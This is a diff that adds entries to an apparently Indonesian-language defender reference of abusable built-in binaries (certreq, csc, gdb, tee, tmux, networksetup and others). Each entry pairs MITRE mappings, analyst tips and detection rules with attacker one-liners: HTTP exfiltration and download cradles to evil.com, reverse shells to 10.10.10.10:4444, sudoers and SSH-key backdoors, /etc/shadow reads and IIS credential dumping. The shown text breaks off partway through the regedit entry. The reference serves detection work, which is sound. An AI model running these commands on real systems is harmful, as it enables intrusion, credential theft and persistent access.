@@ -2282,6 +2282,369 @@ const DB = [
     detect:"Alert frpc binary. Alert outbound TCP ke port 7000/7001. Monitor reverse proxy patterns.",
     ref:["https://attack.mitre.org/techniques/T1572/"] },
 
+  // ┌──────────────────────────────────────────────┐
+  // │       WINDOWS — LOLBins TAMBAHAN             │
+  // └──────────────────────────────────────────────┘
+  { n:"certreq.exe", c:"lolbin", os:"win", p:"C:\\Windows\\System32\\certreq.exe",
+    d:"Certificate request submission tool", r:"HIGH",
+    m:["T1105","T1140"], mn:["Ingress Tool Transfer","Deobfuscate/Decode Files or Information"], t:["Command and Control","Defense Evasion"],
+    tldr:"Mirip certutil tapi lebih jarang di-monitor — bisa download file dari URL via -Post dan -config flags. Signed Microsoft binary, sering lolos rule yang hanya cover certutil. Fokus ke cmdline yang ada URL atau -Post ke external.",
+    abuse:"Download file dari remote URL, exfiltrate data via HTTP POST, decode/upload content ke attacker server.",
+    red:{
+      desc:"File download dan upload via HTTP — Microsoft-signed LOLBin alternatif certutil.",
+      cmds:[
+        {c:"certreq.exe -Post -config http://evil.com/ C:\\Windows\\win.ini output.txt", n:"upload file ke attacker server via HTTP POST — exfil arbitrary files"},
+        {c:"certreq.exe -Post -config http://evil.com/payload C:\\Temp\\in.txt C:\\Temp\\out.txt", n:"download + write output ke file — payload staging"},
+      ]
+    },
+    legit:"PKI certificate management di enterprise environment.",
+    tips:["Cek -Post flag + URL external","Cek -config mengarah ke IP/domain external","Cek file yang di-POST — credentials? config?","Korelasi dengan certutil di environment yang sudah monitor certutil"],
+    detect:"Alert certreq.exe dengan -Post flag + external URL. Monitor cmdline patterns: -Post, -config http.",
+    ref:["https://lolbas-project.github.io/lolbas/Binaries/Certreq/"] },
+
+  { n:"csc.exe", c:"lolbin", os:"win", p:"C:\\Windows\\Microsoft.NET\\Framework64\\v4.x\\csc.exe",
+    d:"C# compiler (.NET Framework)", r:"HIGH",
+    m:["T1027.004","T1059.001"], mn:["Compile After Delivery","PowerShell"], t:["Defense Evasion","Execution"],
+    tldr:"C# compiler yang ada di setiap Windows dengan .NET — attacker bisa compile malware langsung di target tanpa upload binary. Payload dikirim sebagai .cs source code (less suspicious) lalu di-compile on-target. AppLocker bypass karena .exe hasil compile baru, gak ada di whitelist.",
+    chain:{ stage:"Execution / Defense Evasion", flows:["drop .cs source via web/email → csc.exe compile → execute output .exe","powershell.exe download .cs → csc.exe /out:payload.exe → payload.exe exec"] },
+    abuse:"Compile C# malware on-target, AppLocker bypass via compile-and-exec, evade static AV (no PE to detect pre-compile).",
+    red:{
+      desc:"On-target compilation — convert source code jadi executable tanpa upload binary.",
+      cmds:[
+        {c:"csc.exe /noconfig /fullpaths @\"C:\\Temp\\payload.rsp\"", n:"compile dari response file — obfuscate actual source path"},
+        {c:"csc.exe /out:C:\\Temp\\beacon.exe C:\\Temp\\payload.cs", n:"compile .cs source jadi executable — classic compile-after-delivery"},
+        {c:"csc.exe /target:library /out:C:\\Temp\\evil.dll C:\\Temp\\payload.cs", n:"compile jadi DLL — untuk injection atau regsvr32 abuse"},
+      ]
+    },
+    legit:"Development workstation. User endpoint non-dev = suspicious.",
+    tips:["Cek source file yang di-compile — .cs dari mana?","Cek output file location","Cek child process setelah compile","Non-dev endpoint + csc.exe = almost always suspicious","Cek apakah compile dari temp/user directory"],
+    detect:"Alert csc.exe di non-development endpoints. Monitor .cs file creation + subsequent csc.exe exec. Event 4688 process chain.",
+    ref:["https://lolbas-project.github.io/lolbas/Binaries/Csc/"] },
+
+  { n:"ftp.exe", c:"lolbin", os:"win", p:"C:\\Windows\\System32\\ftp.exe",
+    d:"FTP client", r:"MEDIUM",
+    m:["T1059.003","T1105"], mn:["Windows Command Shell","Ingress Tool Transfer"], t:["Execution","Command and Control"],
+    tldr:"FTP client Windows built-in yang bisa execute commands dari script file via -s flag. Sering dipakai untuk download payload dari FTP server attacker atau sebagai non-interactive command exec. Jarang di-monitor karena dianggap legacy.",
+    abuse:"Execute arbitrary commands via script file (-s flag), download payloads dari FTP server attacker.",
+    red:{
+      desc:"Script-based command execution dan file download via FTP.",
+      cmds:[
+        {c:"ftp.exe -s:C:\\Temp\\commands.txt", n:"execute commands dari script file — bisa include arbitrary FTP commands"},
+        {c:"echo open evil.com 21> C:\\Temp\\ftp.txt && echo user anon anon>> C:\\Temp\\ftp.txt && echo get payload.exe C:\\Temp\\payload.exe>> C:\\Temp\\ftp.txt && ftp -s:C:\\Temp\\ftp.txt", n:"download file dari FTP server attacker via scripted ftp.exe"},
+      ]
+    },
+    legit:"Legacy FTP transfers. Jarang dipakai di environment modern.",
+    tips:["Cek -s flag — script file berisi apa?","Cek koneksi FTP ke external IP","Cek file yang di-download","Uncommon di environment modern — seharusnya jarang muncul"],
+    detect:"Alert ftp.exe dengan -s flag. Monitor outbound port 21 dari ftp.exe. Alert ftp.exe spawned by script/office process.",
+    ref:["https://lolbas-project.github.io/lolbas/Binaries/Ftp/"] },
+
+  { n:"wusa.exe", c:"lolbin", os:"win", p:"C:\\Windows\\System32\\wusa.exe",
+    d:"Windows Update Standalone Installer", r:"MEDIUM",
+    m:["T1218","T1574"], mn:["Signed Binary Proxy Execution","Hijack Execution Flow"], t:["Defense Evasion"],
+    tldr:"Windows Update installer yang bisa extract CAB/MSU files ke arbitrary directory — termasuk system32. Dipakai untuk drop DLL ke privileged location untuk DLL hijacking, atau extract payload ke path yang sulit di-write secara normal. Signed Microsoft.",
+    abuse:"Extract files ke arbitrary locations termasuk protected folders, DLL hijacking setup via file drop.",
+    red:{
+      desc:"Extract CAB/MSU ke arbitrary path — dipakai untuk drop file ke protected directories.",
+      cmds:[
+        {c:"wusa.exe C:\\Temp\\evil.msu /extract:C:\\Windows\\System32\\", n:"extract MSU ke System32 — drop DLL untuk hijacking atau payload placement"},
+        {c:"wusa.exe C:\\Temp\\payload.msu /quiet /norestart /extract:C:\\Temp\\out\\", n:"silent extract ke custom path — payload staging"},
+      ]
+    },
+    legit:"Installing Windows hotfix/update packages (.msu files).",
+    tips:["Cek /extract flag — destination path ke mana?","Cek MSU file source","Alert jika extract ke System32 atau Program Files","Korelasi dengan DLL hijacking post-extract"],
+    detect:"Alert wusa.exe dengan /extract flag ke non-standard path. Monitor file creation di system directories post-wusa exec.",
+    ref:["https://lolbas-project.github.io/lolbas/Binaries/Wusa/"] },
+
+  { n:"expand.exe", c:"lolbin", os:"win", p:"C:\\Windows\\System32\\expand.exe",
+    d:"Cabinet file expander", r:"MEDIUM",
+    m:["T1140","T1105"], mn:["Deobfuscate/Decode Files or Information","Ingress Tool Transfer"], t:["Defense Evasion"],
+    tldr:"Built-in tool untuk extract CAB files — bisa dipakai untuk unpack payload yang dikemas sebagai .cab atau untuk copy file dari remote UNC path. Signed Microsoft, sangat jarang di-monitor.",
+    abuse:"Extract/copy files ke arbitrary locations, unpack payloads dari CAB archives.",
+    red:{
+      desc:"File extraction dan copy via Microsoft-signed binary.",
+      cmds:[
+        {c:"expand.exe \\\\evil.com\\share\\payload.cab -F:* C:\\Temp\\", n:"extract CAB dari UNC path ke local — remote payload staging"},
+        {c:"expand.exe C:\\Temp\\packed.cab C:\\Windows\\Temp\\payload.exe", n:"extract single file dari CAB archive"},
+      ]
+    },
+    legit:"Extracting Windows cabinet files, system file expansion.",
+    tips:["Cek source path — UNC? External?","Cek destination path","Jarang dipakai legitimate di user context","Cek CAB file content"],
+    detect:"Alert expand.exe dengan UNC source path. Monitor file creation post-expand.",
+    ref:["https://lolbas-project.github.io/lolbas/Binaries/Expand/"] },
+
+  { n:"extrac32.exe", c:"lolbin", os:"win", p:"C:\\Windows\\System32\\extrac32.exe",
+    d:"CAB extraction utility (Internet Explorer component)", r:"MEDIUM",
+    m:["T1140","T1105"], mn:["Deobfuscate/Decode Files or Information","Ingress Tool Transfer"], t:["Defense Evasion"],
+    tldr:"IE-era CAB extractor yang masih ada di semua Windows. Bisa extract dari URL langsung (download) dan copy file. Sangat jarang di-monitor. Signed Microsoft.",
+    abuse:"Download file dari URL, extract CAB ke arbitrary path, copy files.",
+    red:{
+      desc:"Download dan extract payloads via Microsoft-signed legacy binary.",
+      cmds:[
+        {c:"extrac32.exe /Y /C http://evil.com/payload.exe C:\\Temp\\payload.exe", n:"download file dari URL langsung ke disk — wget/certutil alternative"},
+        {c:"extrac32.exe /Y /C C:\\Temp\\source.exe C:\\Windows\\Temp\\payload.exe", n:"copy file ke arbitrary location — bypass path restrictions"},
+      ]
+    },
+    legit:"Legacy IE CAB extraction. Hampir tidak pernah dipakai legitimate modern.",
+    tips:["Cek source URL atau path","Cek destination","Sangat uncommon — seharusnya tidak pernah muncul","Cek file yang di-copy/extract"],
+    detect:"Alert extrac32.exe dengan URL atau unusual paths. Hampir tidak ada legitimate use modern.",
+    ref:["https://lolbas-project.github.io/lolbas/Binaries/Extrac32/"] },
+
+  { n:"makecab.exe", c:"lolbin", os:"win", p:"C:\\Windows\\System32\\makecab.exe",
+    d:"Cabinet file creation utility", r:"MEDIUM",
+    m:["T1560.001","T1074.001"], mn:["Archive Collected Data: Archive via Utility","Local Data Staging"], t:["Collection","Exfiltration"],
+    tldr:"Built-in Windows tool untuk compress files ke CAB format — dipakai untuk staging data sebelum exfiltration. Sering dipakai post-credential-dump untuk compress NTDS.dit, SAM, lsass.dmp ke satu file kecil sebelum dikirim keluar. Microsoft-signed, jarang di-monitor.",
+    abuse:"Compress sensitive data ke CAB untuk exfiltration, staging multiple files ke single archive.",
+    red:{
+      desc:"Data compression pre-exfil — compress credential files ke single CAB archive.",
+      cmds:[
+        {c:"makecab.exe C:\\Temp\\ntds.dit C:\\Temp\\archive.cab", n:"compress NTDS.dit ke CAB — pre-exfil staging"},
+        {c:"makecab.exe /D CompressionType=LZX /D Cabinet=on C:\\Temp\\lsass.dmp C:\\Temp\\out.cab", n:"LZX compression dump file — smaller archive untuk exfil"},
+      ]
+    },
+    legit:"Software packaging, Windows component deployment.",
+    tips:["Cek file yang di-compress — credentials? Dumps?","Cek destination CAB location","Cek apakah CAB kemudian di-exfil","Korelasi dengan credential dump sebelumnya"],
+    detect:"Alert makecab.exe targeting sensitive files (lsass.dmp, ntds.dit, SAM). Monitor CAB creation post credential-dump activity.",
+    ref:["https://lolbas-project.github.io/lolbas/Binaries/Makecab/"] },
+
+  { n:"appcmd.exe", c:"lolbin", os:"win", p:"C:\\Windows\\System32\\inetsrv\\appcmd.exe",
+    d:"IIS command-line administration tool", r:"HIGH",
+    m:["T1003","T1552.001"], mn:["OS Credential Dumping","Credentials In Files"], t:["Credential Access"],
+    tldr:"IIS management tool yang bisa dump application pool credentials dan connection strings dalam plaintext — termasuk service account passwords. Hanya ada di server dengan IIS installed. ANY non-admin use atau unexpected execution = investigate immediately.",
+    abuse:"Dump IIS application pool credentials, connection strings, service account passwords dalam plaintext.",
+    red:{
+      desc:"Extract credentials dari IIS configuration — service accounts, DB connection strings, app passwords.",
+      cmds:[
+        {c:"appcmd.exe list apppool /processModel.userName:* /processModel.password:*", n:"dump semua app pool credentials — service account usernames + passwords"},
+        {c:"appcmd.exe list apppool /text:*", n:"dump full config semua application pools termasuk credentials"},
+        {c:"appcmd.exe list config -section:system.webServer/security/authentication/basicAuthentication", n:"dump Basic Auth credentials dari IIS config"},
+      ]
+    },
+    legit:"IIS server administration dan configuration management.",
+    tips:["Hanya ada di server dengan IIS — unexpected presence suspicious","Cek siapa yang menjalankan dan dari process apa","Cek output — plaintext passwords?","Alert di non-IIS-admin context","Korelasi dengan lateral movement menggunakan dumped creds"],
+    detect:"Alert appcmd.exe dijalankan oleh non-IIS-admin accounts. Monitor di SIEM sebagai low-volume high-fidelity rule — legitimate use terbatas.",
+    ref:["https://attack.mitre.org/techniques/T1003/"] },
+
+  { n:"infdefaultinstall.exe", c:"lolbin", os:"win", p:"C:\\Windows\\System32\\infdefaultinstall.exe",
+    d:"INF file default installer", r:"HIGH",
+    m:["T1218","T1059"], mn:["Signed Binary Proxy Execution","Command and Scripting Interpreter"], t:["Defense Evasion","Execution"],
+    tldr:"Signed Windows binary yang execute INF script files — mirip cmstp.exe tapi berbeda. Dipakai untuk AppLocker bypass karena trusted binary mengeksekusi script. INF file bisa berisi arbitrary commands via RunPreSetupCommands/RunPostSetupCommands.",
+    abuse:"Execute arbitrary commands via INF script, AppLocker bypass via trusted signed binary.",
+    red:{
+      desc:"Arbitrary command execution melalui INF file — AppLocker bypass.",
+      cmds:[
+        {c:"infdefaultinstall.exe C:\\Temp\\evil.inf", n:"execute INF script — INF berisi commands di [DefaultInstall] section"},
+      ]
+    },
+    legit:"Windows device driver dan software installation via INF files.",
+    tips:["Sangat uncommon di user context","Cek INF file yang di-execute — isinya apa?","Cek parent process","Alert di non-installer context"],
+    detect:"Alert infdefaultinstall.exe di non-installer context. Monitor INF file execution dari temp/user directories.",
+    ref:["https://lolbas-project.github.io/lolbas/Binaries/Infdefaultinstall/"] },
+
+  { n:"syncappvpublishingserver.exe", c:"lolbin", os:"win", p:"C:\\Windows\\System32\\SyncAppvPublishingServer.exe",
+    d:"App-V publishing synchronization utility", r:"HIGH",
+    m:["T1218","T1059.001"], mn:["Signed Binary Proxy Execution","PowerShell"], t:["Defense Evasion","Execution"],
+    tldr:"App-V utility yang bisa execute PowerShell commands tanpa spawn powershell.exe — efektif bypass deteksi yang alert pada powershell.exe process name. Cmdline PS yang di-pass langsung ke binary ini. Sangat jarang legitimate use di non-App-V environments.",
+    abuse:"Execute PowerShell tanpa powershell.exe process (bypass process name detection), AppLocker bypass.",
+    red:{
+      desc:"PowerShell execution proxy — jalankan PS commands tanpa powershell.exe.",
+      cmds:[
+        {c:"SyncAppvPublishingServer.exe \"n; Start-Process calc.exe\"", n:"execute PS command — 'n;' adalah dummy parameter yang required"},
+        {c:"SyncAppvPublishingServer.exe \"n; IEX(New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')\"", n:"download cradle via PS tanpa spawning powershell.exe — bypass process name detection"},
+      ]
+    },
+    legit:"Microsoft App-V (Application Virtualization) environments only.",
+    tips:["Hampir tidak ada di non-App-V environment — immediate flag","Cek command yang di-pass","Alert di environment tanpa App-V deployment","Behavior-based detection lebih efektif dari hash"],
+    detect:"Alert syncappvpublishingserver.exe di non-App-V environment. Monitor cmdline — PS commands di-pass sebagai argument.",
+    ref:["https://lolbas-project.github.io/lolbas/Binaries/Syncappvpublishingserver/"] },
+
+  // ┌──────────────────────────────────────────────┐
+  // │       LINUX — GTFOBins TAMBAHAN              │
+  // └──────────────────────────────────────────────┘
+  { n:"node", c:"interpreter", os:"linux", p:"/usr/bin/node | /usr/local/bin/node",
+    d:"Node.js JavaScript runtime", r:"HIGH",
+    m:["T1059.007","T1059"], mn:["JavaScript","Command and Scripting Interpreter"], t:["Execution"],
+    tldr:"Node.js interpreter — di endpoint non-developer, keberadaannya saja suspicious. GTFOBins: node -e bisa spawn shell, buat reverse connection, atau load arbitrary modules. Sama dengan Python, Impacket-equivalent untuk Node juga ada (e.g. evil-winrm pakai Node).",
+    abuse:"Shell escape via GTFOBins (-e flag), reverse shell, arbitrary script execution, file read/write.",
+    red:{
+      desc:"Arbitrary code execution dan shell spawning via Node.js interpreter.",
+      cmds:[
+        {c:"node -e 'require(\"child_process\").spawn(\"/bin/sh\",[\"-i\"],{stdio:\"inherit\"})'", n:"GTFOBins shell spawn via child_process — instant interactive shell"},
+        {c:"node -e 'var net=require(\"net\"),cp=require(\"child_process\"),sh=cp.spawn(\"/bin/sh\",[\"-i\"]);var c=new net.Socket();c.connect(4444,\"10.10.10.10\",function(){c.pipe(sh.stdin);sh.stdout.pipe(c);sh.stderr.pipe(c)})'", n:"Node.js reverse shell — TCP connection ke attacker"},
+        {c:"node -e 'require(\"fs\").readFileSync(\"/etc/shadow\").toString().split(\"\\n\").forEach(l=>console.log(l))'", n:"read privileged files via Node — bypass shell-based restrictions"},
+      ]
+    },
+    legit:"Web development, server-side JavaScript. Non-dev endpoint = suspicious.",
+    tips:["Cek -e flag — inline code execution","Cek script file yang di-run","Cek network connections dari node process","Cek child processes","Non-dev endpoint + node = investigate"],
+    detect:"Alert node di non-development endpoints. Monitor network connections spawned dari node. Event process creation dengan -e flag.",
+    ref:["https://gtfobins.github.io/gtfobins/node/"] },
+
+  { n:"gdb", c:"lolbin", os:"linux", p:"/usr/bin/gdb",
+    d:"GNU debugger", r:"HIGH",
+    m:["T1548.001","T1059.004"], mn:["SUID and SGID","Unix Shell"], t:["Privilege Escalation","Execution"],
+    tldr:"GNU debugger yang bisa spawn shell via 'call system()' atau GTFOBins techniques — kalau gdb punya SUID bit atau ada di sudoers, itu instant root shell. Juga dipakai untuk attach ke running processes dan extract memory/credentials tanpa tool khusus.",
+    abuse:"GTFOBins shell escape via SUID/sudo, attach ke running process untuk memory extraction, arbitrary command execution.",
+    red:{
+      desc:"Shell escalation via GTFOBins dan process memory access via debugger attachment.",
+      cmds:[
+        {c:"gdb -nx -ex 'python import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")' -ex quit", n:"GTFOBins SUID — spawn shell dengan elevated privileges jika gdb SUID"},
+        {c:"sudo gdb -nx -ex '!sh' -ex quit", n:"GTFOBins sudo — instant root shell jika gdb di sudoers"},
+        {c:"gdb -p $(pgrep -n sudo) -batch -ex 'call (void)system(\"cp /bin/bash /tmp/bash && chmod +s /tmp/bash\")'", n:"attach ke process + inject system call — SUID bash backdoor"},
+      ]
+    },
+    legit:"Software debugging pada development systems. Server production = rare.",
+    tips:["Cek apakah gdb punya SUID bit","Cek gdb di /etc/sudoers","Cek process attachment — gdb -p <PID>","Cek command yang di-inject via -ex","Alert gdb di production servers"],
+    detect:"Alert gdb di production/server environment. Monitor gdb attach ke privileged processes (sudo, sshd). Check SUID bit pada gdb binary.",
+    ref:["https://gtfobins.github.io/gtfobins/gdb/"] },
+
+  { n:"tee", c:"lolbin", os:"linux", p:"/usr/bin/tee",
+    d:"Read from stdin and write to files", r:"MEDIUM",
+    m:["T1222.002","T1548.001"], mn:["File and Directory Permissions Modification","SUID and SGID"], t:["Defense Evasion","Privilege Escalation"],
+    tldr:"tee bisa write ke files dengan privilege level siapa yang menjalankannya — kalau ada di sudoers atau SUID, bisa overwrite file system yang seharusnya read-only. Classic priv esc: sudo tee overwrite /etc/sudoers atau /etc/passwd. Juga dipakai untuk write cron jobs, SSH keys, service configs.",
+    abuse:"Overwrite privileged files via sudo (sudoers, passwd, cron), write SSH keys, drop payloads ke restricted paths.",
+    red:{
+      desc:"Privileged file write via sudo tee — bypass normal write restrictions.",
+      cmds:[
+        {c:"echo 'attacker ALL=(ALL) NOPASSWD:ALL' | sudo tee -a /etc/sudoers", n:"append ke sudoers — backdoor root access tanpa password"},
+        {c:"echo 'ssh-rsa AAAA...' | sudo tee -a /root/.ssh/authorized_keys", n:"add SSH key ke root — persistent access"},
+        {c:"echo '* * * * * root bash -i >& /dev/tcp/10.10.10.10/4444 0>&1' | sudo tee -a /etc/cron.d/update", n:"write root crontab via tee — persistent reverse shell"},
+      ]
+    },
+    legit:"Pipe output ke file sambil tetap display di terminal. Common dalam shell scripts.",
+    tips:["Cek context sudo tee — file apa yang di-write?","Alert tee ke /etc/sudoers, /etc/passwd, ~/.ssh/authorized_keys","Cek via sudoers config — siapa yang bisa sudo tee?","Cek file permissions sebelum dan sesudah"],
+    detect:"Alert sudo tee ke sensitive paths (/etc/sudoers, /etc/passwd, /root/.ssh). Monitor file write events ke critical config files.",
+    ref:["https://gtfobins.github.io/gtfobins/tee/"] },
+
+  { n:"lua", c:"interpreter", os:"linux", p:"/usr/bin/lua | /usr/bin/lua5.x",
+    d:"Lua scripting language interpreter", r:"MEDIUM",
+    m:["T1059","T1548.001"], mn:["Command and Scripting Interpreter","SUID and SGID"], t:["Execution","Privilege Escalation"],
+    tldr:"Lightweight scripting interpreter — kalau ada di sudoers atau SUID, GTFOBins bisa instant shell. os.execute() dari Lua bisa spawn arbitrary commands. Sering di-install di embedded systems, network devices, game servers.",
+    abuse:"GTFOBins shell escape via SUID/sudo, arbitrary command execution via os.execute().",
+    red:{
+      desc:"Shell execution dan privilege escalation via Lua interpreter.",
+      cmds:[
+        {c:"lua -e 'os.execute(\"/bin/sh\")'", n:"GTFOBins — spawn shell via os.execute"},
+        {c:"sudo lua -e 'os.execute(\"/bin/sh\")'", n:"instant root shell jika lua di sudoers"},
+        {c:"lua -e 'local f=io.open(\"/etc/shadow\",\"r\");print(f:read(\"*a\"));f:close()'", n:"read privileged files via Lua file I/O"},
+      ]
+    },
+    legit:"Embedded scripting dalam aplikasi (game engines, network tools, IoT firmware).",
+    tips:["Cek SUID bit pada lua binary","Cek lua di /etc/sudoers","Alert lua di endpoint non-game/non-embedded","Cek os.execute() dalam scripts"],
+    detect:"Alert sudo lua atau SUID lua. Monitor lua exec di non-expected environments.",
+    ref:["https://gtfobins.github.io/gtfobins/lua/"] },
+
+  { n:"tmux", c:"utility", os:"linux", p:"/usr/bin/tmux",
+    d:"Terminal multiplexer", r:"MEDIUM",
+    m:["T1543","T1563.001"], mn:["Create or Modify System Process","Remote Service Session Hijacking: SSH Hijacking"], t:["Persistence","Lateral Movement"],
+    tldr:"Terminal multiplexer yang sering dipakai legitimate, tapi dipakai attacker untuk: (1) persist session yang survive logout via detached sessions, (2) hijack tmux socket yang world-writable untuk lateral movement/priv esc. Cek tmux sessions aktif di server post-incident — sering ada attacker session yang masih running.",
+    abuse:"Persist shell session yang survive logout, hijack socket dari user lain, session-based backdoor.",
+    red:{
+      desc:"Session persistence dan socket hijacking via tmux.",
+      cmds:[
+        {c:"tmux new-session -d -s backdoor 'bash -i >& /dev/tcp/10.10.10.10/4444 0>&1'", n:"create detached tmux session yang jalankan reverse shell — survive logout"},
+        {c:"tmux -S /tmp/.tmux_socket new-session -d", n:"create socket di temp — bisa di-attach user lain"},
+        {c:"tmux -S /var/run/target_user/.tmux attach", n:"attach ke tmux session user lain jika socket world-readable — session hijack"},
+      ]
+    },
+    legit:"Remote work persistence, multiple terminal management. Sangat common di sysadmin.",
+    tips:["Run: tmux ls — lihat semua active sessions","Cek tmux sockets: find /tmp -name '.tmux*'","Cek siapa owner tiap session","Cek command yang running di tiap window/pane","Harden: chmod 700 tmux socket"],
+    detect:"Monitor tmux socket creation di world-writable paths. Alert unexpected tmux sessions di production servers. Audit active tmux sessions post-incident.",
+    ref:["https://attack.mitre.org/techniques/T1563/001/"] },
+
+  // ┌──────────────────────────────────────────────┐
+  // │       macOS — TAMBAHAN                       │
+  // └──────────────────────────────────────────────┘
+  { n:"plutil", c:"lolbin", os:"macos", p:"/usr/bin/plutil",
+    d:"Property list utility", r:"MEDIUM",
+    m:["T1543.001","T1547.011"], mn:["Launch Agent","Plist Modification"], t:["Persistence","Defense Evasion"],
+    tldr:"macOS plist editor/converter — dipakai attacker untuk create atau modify LaunchAgent/LaunchDaemon plist files untuk persistence. Bisa convert antara XML dan binary plist. Plist yang di-create via plutil sering lebih valid secara format daripada yang di-edit manual.",
+    abuse:"Create atau modify LaunchAgent/LaunchDaemon plist untuk persistence, convert/manipulate plist files.",
+    red:{
+      desc:"Plist manipulation untuk persistence via LaunchAgent/LaunchDaemon.",
+      cmds:[
+        {c:"plutil -create xml1 ~/Library/LaunchAgents/com.update.plist && plutil -insert Label -string 'com.update' ~/Library/LaunchAgents/com.update.plist", n:"create LaunchAgent plist — persistence yang load saat login"},
+        {c:"plutil -replace ProgramArguments -json '[\"bash\",\"-c\",\"bash -i >& /dev/tcp/10.10.10.10/4444 0>&1\"]' ~/Library/LaunchAgents/com.update.plist", n:"inject reverse shell command ke plist"},
+        {c:"plutil -convert binary1 malicious.plist", n:"convert ke binary plist — harder to read/detect via text search"},
+      ]
+    },
+    legit:"macOS application development, plist debugging.",
+    tips:["Cek LaunchAgents/LaunchDaemons yang baru dibuat","Cek plist content — ProgramArguments berisi apa?","Alert plutil yang create/modify plist di ~/Library/LaunchAgents","Cek apakah plist sudah di-load (launchctl list)"],
+    detect:"Monitor plist creation/modification di LaunchAgent/LaunchDaemon paths. Alert plutil write ke persistence locations.",
+    ref:["https://attack.mitre.org/techniques/T1543/001/"] },
+
+  { n:"networksetup", c:"lolbin", os:"macos", p:"/usr/sbin/networksetup",
+    d:"macOS network configuration tool", r:"HIGH",
+    m:["T1556","T1090.001","T1071.004"], mn:["Modify Authentication Process","Proxy","DNS"], t:["Defense Evasion","Command and Control"],
+    tldr:"macOS network config tool yang bisa modify DNS servers dan proxy settings — attacker pakai ini untuk redirect victim DNS ke malicious resolver (DNS hijack) atau force semua traffic lewat attacker proxy. Butuh sudo/admin tapi efeknya persisten sampai di-reset.",
+    abuse:"DNS hijacking via custom resolver, proxy hijacking untuk intercept traffic, network config manipulation.",
+    red:{
+      desc:"Persistent network manipulation — DNS dan proxy redirection.",
+      cmds:[
+        {c:"networksetup -setdnsservers Wi-Fi 192.168.1.100 8.8.8.8", n:"set custom DNS server — redirect DNS queries ke attacker-controlled resolver"},
+        {c:"networksetup -setsecurewebproxy Wi-Fi evil.com 8080", n:"set HTTPS proxy — intercept semua HTTPS traffic"},
+        {c:"networksetup -setwebproxy Wi-Fi evil.com 8080", n:"set HTTP proxy — MITM semua HTTP traffic"},
+        {c:"networksetup -setautoproxyurl Wi-Fi http://evil.com/proxy.pac", n:"set PAC file URL — dynamic proxy config dari attacker server"},
+      ]
+    },
+    legit:"macOS network configuration oleh IT admin.",
+    tips:["Cek DNS settings: networksetup -getdnsservers Wi-Fi","Cek proxy settings: networksetup -getwebproxy Wi-Fi","Alert perubahan DNS ke non-corporate resolvers","Cek PAC file URL","Korelasi dengan traffic anomaly setelah perubahan"],
+    detect:"Monitor networksetup execution dengan DNS/proxy flags. Alert DNS changes ke non-approved resolvers. Audit network config post-incident.",
+    ref:["https://attack.mitre.org/techniques/T1090/001/"] },
+
+  { n:"screencapture", c:"lolbin", os:"macos", p:"/usr/sbin/screencapture",
+    d:"macOS screen capture utility", r:"MEDIUM",
+    m:["T1113"], mn:["Screen Capture"], t:["Collection"],
+    tldr:"Built-in macOS screenshot tool yang bisa capture screen silently dari command line. Dipakai attacker untuk surveillance — capture layar victim secara periodic untuk credential harvesting atau data collection. -x flag = silent tanpa shutter sound.",
+    abuse:"Silent screen capture untuk surveillance, periodic screenshot untuk credential harvesting, screen recording.",
+    red:{
+      desc:"Silent screenshot capture dari CLI — surveillance dan data collection.",
+      cmds:[
+        {c:"screencapture -x /tmp/.screenshot.png", n:"-x = silent (no shutter sound) — stealth capture ke hidden file"},
+        {c:"while true; do screencapture -x /tmp/sc_$(date +%s).png; sleep 30; done", n:"periodic screenshot loop — surveillance every 30 seconds"},
+        {c:"screencapture -x -t jpg -m /tmp/capture.jpg", n:"capture single display ke JPEG — smaller file untuk exfil"},
+      ]
+    },
+    legit:"Screenshot utility, screen recording. Common legitimate use.",
+    tips:["Cek -x flag (silent mode) di cmdline","Alert screencapture dalam loop/script","Cek output file location dan deletion patterns","Cek parent process — siapa yang spawn?","Korelasi dengan exfil activity post-capture"],
+    detect:"Alert screencapture dengan -x flag dari non-user-interactive context. Monitor periodic screencapture execution via cron atau loop.",
+    ref:["https://attack.mitre.org/techniques/T1113/"] },
+
+  // ┌──────────────────────────────────────────────┐
+  // │       WINDOWS — COMMON / LOW NOISE          │
+  // └──────────────────────────────────────────────┘
+  { n:"mmc.exe", c:"lolbin", os:"win", p:"C:\\Windows\\System32\\mmc.exe",
+    d:"Microsoft Management Console", r:"MEDIUM",
+    m:["T1218","T1059"], mn:["Signed Binary Proxy Execution","Command and Scripting Interpreter"], t:["Defense Evasion","Execution"],
+    tldr:"MMC bisa load arbitrary snap-ins (.msc files) yang bisa berisi malicious COM objects atau execute code. Sering muncul di logs karena legitimate admin use, tapi .msc file yang di-load dari temp/user directory = suspicious. Juga dipakai untuk UAC bypass via certain snap-ins.",
+    abuse:"Load malicious .msc snap-in, UAC bypass via trusted process, execute code via COM objects dalam snap-in.",
+    red:{
+      desc:"Malicious snap-in loading via trusted MMC process.",
+      cmds:[
+        {c:"mmc.exe C:\\Temp\\evil.msc", n:"load malicious MSC file — execute code via snap-in COM object"},
+        {c:"mmc.exe -Embedding", n:"COM elevation — used in UAC bypass techniques"},
+      ]
+    },
+    legit:"Windows administrative tools — Computer Management, Group Policy, etc. Sangat common.",
+    tips:["Cek .msc file yang di-load — path-nya legitimate?","Alert .msc dari temp/user directories","Cek child processes dari mmc.exe","Common FP: admin tools — kontekstualisasi dengan user role","Cek -Embedding flag"],
+    detect:"Alert mmc.exe loading .msc dari non-standard paths. Monitor child process creation dari mmc.exe.",
+    ref:["https://lolbas-project.github.io/lolbas/Binaries/Mmc/"] },
+
+  { n:"regedit.exe", c:"utility", os:"win", p:"C:\\Windows\\regedit.exe",
+    d:"Windows Registry Editor", r:"LOW",
+    m:["T1547.001","T1562.001","T1112"], mn:["Registry Run Keys","Disable or Modify Tools","Modify Registry"], t:["Persistence","Defense Evasion"],
+    tldr:"Registry editor GUI — sendiri sangat common dan legitimate. Yang suspicious: dipakai dari script/non-interactive context, /s flag untuk silent import .reg file, atau spawned dari unusual parent. Analyst perlu tau ini bukan threat sendiri tapi marker perlu dilihat context-nya.",
+    abuse:"Silent import .reg file untuk persistence/modification, disable security tools via registry, modify Run keys.",
+    red:{
+      desc:"Silent registry import untuk persistence atau security control modification.",
+      cmds:[
+        {c:"regedit.exe /s C:\\Temp\\payload.reg", n:"/s = silent import tanpa dialog — import arbitrary registry keys"},
+        {c:"regedit.exe /s C:\\Temp\\disable_defender.reg", n:"silently import reg file yang disable Windows Defender"},
+      ]
+    },
+    legit:"Sangat common — IT admin, troubleshooting, software install. Fokus ke context bukan binary-nya.",
